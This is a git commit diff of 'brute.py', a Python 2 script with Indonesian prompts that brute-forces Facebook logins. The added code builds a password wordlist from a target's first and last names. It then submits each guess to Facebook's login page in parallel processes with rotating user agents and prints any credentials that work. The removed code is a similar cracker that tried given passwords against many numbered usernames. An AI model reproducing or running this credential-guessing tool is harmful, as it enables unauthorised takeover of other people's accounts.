cee5fd108b8395329ab82818db60e72dde562b97
AdeMara01 <65954818+AdeMara01@users.noreply.github.com>
2020-07-21 01:15:49 +0700

    Add files via upload

--- brute.py
+++ brute.py
@@ -1,113 +1,114 @@
 # -*- coding UTF-8 -*-
-#  Author : Ade Mara
-#  Tools : AdeMara01
+#  Author : Iqbal Dev
+#  Tools : Geli2 Efbeh
 #  Versi : 0.2
 
-from brute import brute
-from mechanize import Browser
+from prettytable import PrettyTable
 from multiprocessing import Process
-from useragents import baner, multi_ban, deviv, divev
-import os, sys, time, cookielib, mechanize, subprocess
-os.system('' if os.name == 'nt' else 'chmod +x *')
-multi = []
+from useragents import user_agents, string1, string2
+import os, sys, time, random, cookielib, mechanize
+s = '\n  \033[92;1m         Suksess... \n        Password Found '
+multi_dev = []
+sandi = []
+def Wordlist():
 
+	try:
+		print string1
+		print "\033[96;1m        B U A T   W O R D L I $ T "
+		print '\033[92;1m+'+'-'*38+'+' 
+		nama1 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Masukkan Nama Depan Target\033[93;1m : ")
+		nama2 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Masukkan Nama Belakang Target\033[93;1m : ")
+		if nama1 == '' or nama2 == '':
+			sys.exit("\n\033[91;1m Jangan Kosong dong Sayang!\n Kamu Keluar...")
+		d = nama1.replace(' ', '').replace('  ', '')
+		b = nama2.replace(' ', '').replace('  ', '')
+		lis = ['123','12345','321']
+		# ////////////////////////////////////////////
+		for dev in lis:
+			sandi.append(nama1+dev)
+		for dev in lis:
+			sandi.append(nama2+dev)
+		sandi.append('sayang')
+		sandi.append('anjing')
+	except KeyboardInterrupt:
 
-dev = Browser()
-cj = cookielib.LWPCookieJar()
+		print "\n Keluar.... "
+
+	print " \n\033[92;1m   Suksess Membuat Wordlist..."
+		
+
+dev = mechanize.Browser()
+cok = cookielib.LWPCookieJar()
 dev.set_handle_robots(False)
 dev.set_handle_redirect(True)
-dev.set_cookiejar(cj)
+dev.set_cookiejar(cok)
 dev.set_handle_equiv(True)
 dev.set_handle_referer(True)
 dev.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-log = "https://www.facebook.com/login.php?login_attempt=1"
-# log1 = "https://m.facebook.com" 
-# users = open("user.txt", "r").readlines()
-users = []
 
-def user_dev():
-  try:
-  	print multi_ban
-  	us = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Masukkan Nama Facebook, Conth:\033[96;1m lucinta\n\033[97;1m  ==> ")
-  	jumlah = input("\n\033[96;1m\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Jumlah User Yg Mau Di Crack\033[96;1m (Max=1000):\n\033[93;1m  ==> ")
-  	san_dev = raw_input("\n\033[96;1m\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Sandi Yg Munkin Digunkn, conth:\033[96;1m lucinta123\n\033[97;1m  ==> ")
-  	# set password
-  	if us == '' or us == ' ' or san_dev == '' or san_dev == ' ':
-  		exit('\n \033[91;1m Jangan Kosong Lah Kamprett.. \n')
-  	print '\n\033[95;1m<<\033[96;1m Proses Cracking Sedang Berjalan,Tunggu Ajh!\033[95;1m >> \n'
-  	sandi1 = san_dev.replace(' ', '\n').replace(',', '\n').replace('/', '\n')
-  	sandi = sandi1.replace('\n\n', '\n')
-  	# set usernmae
-  	userz = us.replace(' ', '.')
-  	p = open("pass.txt", "w")
-  	p.write(sandi)
-  	p.close()
-  	for has in range(1, jumlah+1):
-  	  try:
-  		users.append(userz+'.'+str(has))
-  	  except:
-  	  	pass
-  except KeyboardInterrupt: 
-  	exit("\033[91;1m \n Keluar... \n")
-  except NameError:
-  	exit('\n\033[91;1m Masukkan Angka Dodoll..\n')
 
-def pro_dev(ival):
-	pas = open("pass.txt", "r").readlines()
-	iqbal = ival.replace('\n', '')
-	for iq in pas:
+# DEv = open('word1.txt', 'r').readlines()
+# deV = open('word2.txt', 'r').readlines()
+lol = 'https://www.facebook.com/login.php?login_attempt=1'
+# sandi = open('pass.txt', 'r').readlines()
+
+
+def target():
+	global target
+
+	# os.system('cls' if os.name == 'nt' else 'clear')
+	print string2
+	user = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Masukkan Username Target:\n\033[93;1m  => \033[97;1m ")
+	print '+'+'-'*38+'+'
+	pasw = open('user.txt', 'w')
+	pasw.write(user)
+	pasw.close() 
+	
+
+def br_dev1(paswq):
+	usr = open('user.txt', 'r').read()
+	wak = time.ctime()
+	pas = paswq.replace('\n', '')
+	print '\033[96;1m ' + wak + " \033[95;1m" + pas 
+	dev.addheaders = [('User_agent', random.choice(user_agents))]
+	url = dev.open(lol)
+	dev.select_form(nr = 0)
+	dev.form['email'] = usr
+	dev.form['pass'] = pas
+	mleb = dev.submit()
+	meki = mleb.geturl()
+	if meki != lol and (not 'login_attempt' in meki):
 	  try:
-		iqu = iq.replace('\n', '').replace('\n\n', '') # print str(iqbal) + " | " + iqu 
-		dev.addheaders = [('User-Agent', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14')]
-		dev.open(log)
-		dev.select_form(nr=0)
-		dev.form['email'] = ival
-		dev.form['pass'] = iqu
-		sub = dev.submit()
-		mask = sub.geturl()
-		if mask != log and not 'login_attempt' in mask:
-			print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ iqbal + '\033[96;1m |\033[92;1m '+ iqu 
+		x = PrettyTable()
+		print s
+		x.add_column("\033[92;1mUsername\033[97;1m", ['\033[96;1m'+usr+'\033[97;1m'])
+		x.add_column("\033[92;1mPassword\033[97;1m", ['\033[96;1m'+pas+'\033[97;1m'])
+		print '\033[97;1m'
+		print x
+		raw_input('\n\033[96;1m  Selamat Anda Sedang Beruntung :)\n')
+
 	  except:
-	  	pass
-
-def dev_id():
-	for dev in users:
-		pro = Process(target=pro_dev, args=(dev,))
-		multi.append(pro)
-		pro.start()
-
-	for dev in multi:
+	  	pass        
+		
+		  	
+def multi():	
+	for dev in sandi:
+		proc = Process(target=br_dev1, args=(dev,))
+		multi_dev.append(proc)
+		proc.start()
+	for dev in multi_dev:
 		dev.join()
 
-def run():
-	th = Process(target=dev_id)
-	th.start()
-	th.join()
-	divev()
-	deviv()
-	print "\n\033[97;1m     ==[ \033[96;1m Selesai......\033[97;1m  ]== \n"
-if __name__ == '__main__':
+def brute():
+	Wordlist()
+	target()
 	try:
-		os.system('cls' if os.name == 'nt' else 'clear')
-		print baner
-		pil = raw_input("\033[96;1m {\033[95;1m?\033[96;1m}\033[92;1m Pilih Opsi\033[93;1m : ")
-		if pil == '1':
-			brute()
-		elif pil == '2':
-			user_dev()
-			run()
-		elif pil == '3':
-			try:
-				print " \n\n \033[97;1m        +++[ \033[96;1m Tools Versi 0.2 \033[97;1m ]+++" 
-				print " \n               \033[93;1m Keunggulan:\n\n   \033[97;1m   Lebih Power Full dibanding yg V.01 \n      bisa mengisi lebih dari 1 password  \n"
-				print " \n\033[95;1m   Silahkan Ikuti Instagram saya \033[96;1m(IqbalDev)"
-				raw_input(" \033[97;1m    Tekan Enter Untuk Membuka Instagram..")
-				subprocess.check_output(['am', 'start', 'https://www.instagram.com/iqbaldev/'])
-				os.system('multi_dev.py' if os.name == 'nt' else 'python2 multi_dev.py')
-			except KeyboardInterrupt:
-				subprocess.check_output(['am', 'start', 'https://www.instagram.com/iqbaldev/'])
-				os.system('multi_dev.py' if os.name == 'nt' else 'python2 multi_dev.py')
-		else:
-			print "\n\033[90;1m Pilih yang Bener lah Kampprett.. "
+		thr1 = Process(target=multi)
+		thr1.start()
+		thr1.join()
 	except KeyboardInterrupt:
-		exit("\n\033[90;1m Keluar... ")
+		exit('\n Keluar.... \n')
+
+	print '\n\033[92;1m    Selesai Broo..... \n'
+
+
